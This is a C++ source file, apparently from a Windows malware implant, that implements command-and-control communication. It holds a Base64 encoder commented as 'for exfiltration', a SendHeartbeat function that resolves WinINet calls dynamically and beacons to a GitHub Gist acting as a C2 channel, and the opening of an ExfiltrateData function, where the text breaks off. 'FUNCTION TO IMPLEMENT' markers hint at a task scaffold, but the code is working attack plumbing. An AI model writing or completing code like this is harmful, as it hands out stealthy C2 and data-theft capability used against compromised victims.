// c2_communication.cpp

#include "c2_communication.h"
#include "api_resolution.h"
#include <stdio.h>
#include <time.h>

// Simple, self-contained Base64 encoder for exfiltration
void simpleBase64Encode(const char* input, char* output, int out_size) {
    const char* base64_chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    int in_len = strlen(input);
    int i = 0, j = 0, x = 0;
    unsigned char char_array_3[3], char_array_4[4];

    while (in_len--) {
        char_array_3[i++] = *(input++);
        if (i == 3) {
            char_array_4[0] = (char_array_3[0] & 0xfc) >> 2;
            char_array_4[1] = ((char_array_3[0] & 0x03) << 4) + ((char_array_3[1] & 0xf0) >> 4);
            char_array_4[2] = ((char_array_3[1] & 0x0f) << 2) + ((char_array_3[2] & 0xc0) >> 6);
            char_array_4[3] = char_array_3[2] & 0x3f;

            for (i = 0; i < 4; i++)
                output[x++] = base64_chars[char_array_4[i]];
            i = 0;
        }
    }

    if (i) {
        for (j = i; j < 3; j++)
            char_array_3[j] = '\0';

        char_array_4[0] = (char_array_3[0] & 0xfc) >> 2;
        char_array_4[1] = ((char_array_3[0] & 0x03) << 4) + ((char_array_3[1] & 0xf0) >> 4);
        char_array_4[2] = ((char_array_3[1] & 0x0f) << 2) + ((char_array_3[2] & 0xc0) >> 6);
        char_array_4[3] = char_array_3[2] & 0x3f;

        for (j = 0; j < i + 1; j++)
            output[x++] = base64_chars[char_array_4[j]];

        while ((i++ < 3))
            output[x++] = '=';
    }
    output[x] = '\0';
}


// --- FUNCTION TO IMPLEMENT ---
BOOL SendHeartbeat() {
    // Resolve all required WinINet functions dynamically
    pInternetOpenA InternetOpenA = (pInternetOpenA)resolve_api("wininet.dll", "InternetOpenA");
    pInternetConnectA InternetConnectA = (pInternetConnectA)resolve_api("wininet.dll", "InternetConnectA");
    pHttpOpenRequestA HttpOpenRequestA = (pHttpOpenRequestA)resolve_api("wininet.dll", "HttpOpenRequestA");
    pHttpSendRequestA HttpSendRequestA = (pHttpSendRequestA)resolve_api("wininet.dll", "HttpSendRequestA");
    pInternetCloseHandle InternetCloseHandle = (pInternetCloseHandle)resolve_api("wininet.dll", "InternetCloseHandle");
    pGetTickCount GetTickCount = (pGetTickCount)resolve_api("kernel32.dll", "GetTickCount");

    if (!InternetOpenA || !InternetConnectA || !HttpOpenRequestA || !HttpSendRequestA || !InternetCloseHandle || !GetTickCount) {
        return FALSE;
    }

    // 1. Open an internet connection
    HINTERNET hInternet = InternetOpenA("Mozilla/5.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet) return FALSE;

    // 2. Connect to the GitHub server
    HINTERNET hConnect = InternetConnectA(hInternet, "api.github.com", INTERNET_DEFAULT_HTTPS_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
    if (!hConnect) {
        InternetCloseHandle(hInternet);
        return FALSE;
    }

    // 3. Build the POST request
    char requestUrl[512];
    sprintf_s(requestUrl, sizeof(requestUrl), "/gists/%s", C2_GIST_ID);

    HINTERNET hRequest = HttpOpenRequestA(hConnect, "POST", requestUrl, "HTTP/1.1", NULL, NULL, INTERNET_FLAG_SECURE | INTERNET_FLAG_RELOAD, 0);
    if (!hRequest) {
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        return FALSE;
    }

    // 4. Create the JSON body for the POST request
    char heartbeatData[64];
    sprintf_s(heartbeatData, sizeof(heartbeatData), "%lu", GetTickCount());
    
    char jsonBody[1024];
    sprintf_s(jsonBody, sizeof(jsonBody),
        "{"
        "\"description\": \"C2 Heartbeat\","
        "\"files\": {"
        "\"%s\": {"
        "\"content\": \"%s\""
        "}"
        "}"
        "}",
        C2_HEARTBEAT_FILENAME, heartbeatData);

    // 5. Add necessary headers for the API call
    const char* headers = "Content-Type: application/json\r\nAccept: application/vnd.github.v3+json\r\n";

    // 6. Send the request
    if (!HttpSendRequestA(hRequest, headers, -1L, jsonBody, strlen(jsonBody))) {
        InternetCloseHandle(hRequest);
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        return FALSE;
    }

    // 7. Clean up handles
    InternetCloseHandle(hRequest);
    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);

    return TRUE;
}


// --- FUNCTION TO IMPLEMENT ---
BOOL ExfiltrateData(const char* dataToExfil) {
    if (!dataToExfil) return FALSE;

    // Resolve all required WinINet functions dynamically
    pInternetOpenA InternetOpenA = (pInternetOpenA)resolve_api("wininet.dll", "InternetOpenA");
    pInternetConnectA InternetConnectA = (pInternetConnectA)resolve_api("wininet.dll", "InternetConnectA");
    pHttpOpenRequestA HttpOpenRequestA = (pHttpOpenRequestA)resolve_api("wininet.dll", "HttpOpenRequestA");
    pHttpSendRequestA HttpSendRequestA = (pHttpSendRequestA)resolve_api("win
